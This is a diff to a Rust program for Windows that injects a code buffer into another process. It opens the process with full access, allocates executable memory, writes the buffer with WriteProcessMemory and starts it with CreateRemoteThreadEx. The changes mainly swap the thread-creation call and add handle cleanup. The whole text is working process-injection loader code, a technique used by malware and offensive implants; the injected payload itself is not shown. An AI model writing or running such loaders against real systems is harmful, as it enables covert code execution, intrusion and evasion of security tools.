@@ -11,7 +11,7 @@ use windows::Win32::System::Memory::{
     VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
 };
 use windows::Win32::System::Threading::{
-    CreateRemoteThread, GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_ALL_ACCESS,
+    CreateRemoteThreadEx, GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_ALL_ACCESS,
 };
 
 #[allow(unused_must_use, unused_variables)]
@@ -64,32 +64,36 @@ fn main() {
         }
 
         match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
-            Ok(proc) => {
+            Ok(hProcess) => {
                 let r_buf = VirtualAllocEx(
-                    proc,
+                    hProcess,
                     Some(null_mut()),
                     buf.len(),
                     MEM_RESERVE | MEM_COMMIT,
                     PAGE_EXECUTE_READWRITE,
                 );
 
-                if let Err(_) = WriteProcessMemory(proc, r_buf, buf.as_ptr() as _, buf.len(), None)
+                if let Err(_) = WriteProcessMemory(hProcess, r_buf, buf.as_ptr() as _, buf.len(), None)
                 {
                     println!("[-] Error when performing WriteProcessMemory");
+                    CloseHandle(hProcess);
                     std::process::exit(0)
                 }
 
                 println!("[+] CreateRemoteThread Executed!");
-                let r_thread = CreateRemoteThread(
-                    proc,
+                let tid = 0;
+                let hThread = CreateRemoteThreadEx(
+                    hProcess,
                     None,
                     0,
                     Some(std::mem::transmute(r_buf)),
                     None,
                     0,
                     None,
-                );
-                CloseHandle(proc);
+                    Some(tid as _)
+                ).unwrap();
+                CloseHandle(hProcess);
+                CloseHandle(hThread);
             }
             Err(erro) => {
                 println!("[-] Error when performing OpenProcess");
